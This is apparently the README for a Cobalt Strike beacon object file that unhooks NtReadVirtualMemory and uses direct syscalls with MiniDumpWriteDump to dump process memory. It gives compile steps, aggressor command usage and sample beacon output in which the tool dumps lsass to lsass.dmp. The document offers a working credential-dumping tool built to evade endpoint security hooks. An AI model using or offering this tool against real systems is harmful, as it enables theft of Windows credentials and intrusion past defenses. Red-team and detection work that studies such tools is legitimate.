## Static Syscalls Process Dump BOF (64-bit only)

Beacon object file to:
- Unhook NtReadVirtualMemory function.
- Create process memory dump using MiniDumpWriteDump function to specified (or default) location

Syscalls generated using @jthuraisamy's [SysWhispers](https://github.com/jthuraisamy/SysWhispers) and @Outflanknl's [InlineWhispers](https://github.com/outflanknl/InlineWhispers).

This is effectively a rough port of @Outflank's [Dumpert](https://github.com/outflanknl/Dumpert) tool. All credit to them for that.

## Compile

```
make
```

## Usage

Aggressor script included with the following command:
- `static_syscalls_dump PID output_file` - Creates a dump for the specified PID at the supplied location.
- `static_syscalls_dump PID` - Not providing an output location will default to "C:\Windows\Temp\PID-[target_pid].dmp" 

> NOTE: BOF is for 64-bit use only.


### Example Output
```
beacon> static_syscalls_dump 4337 C:\Users\user\Desktop\lsass.dmp
[*] Syscalls Process Dump BOF (@ajpc500)
[+] host called home, sent: 8904 bytes
[+] received output:
Using Syscalls for Windows 10 or Server 2016, build number 19041
Dumping PID 4337 to file: C:\Users\user\Desktop\lsass.dmp

[+] received output:
Success!
```